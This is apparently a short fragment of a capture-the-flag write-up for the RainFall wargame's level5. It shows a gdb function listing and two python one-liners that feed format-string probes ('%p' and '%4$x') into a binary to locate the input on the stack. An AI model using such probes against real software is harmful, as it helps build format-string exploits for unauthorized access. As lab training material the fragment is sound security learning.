
```
(gdb) set height 30
(gdb) i func
0x080484a4  o
0x080484c2  n
0x08048504  main
```

```
level5@RainFall:~$ python -c 'print "AAAA" + " |%p| " * 20 ' | ./level5
AAAA |0x200|  |0xb7fd1ac0|  |0xb7ff37d0|  |0x41414141|

level5@RainFall:~$ python -c 'print "AAAA" + " |%4$x| " ' | ./level5
AAAA |41414141|
```
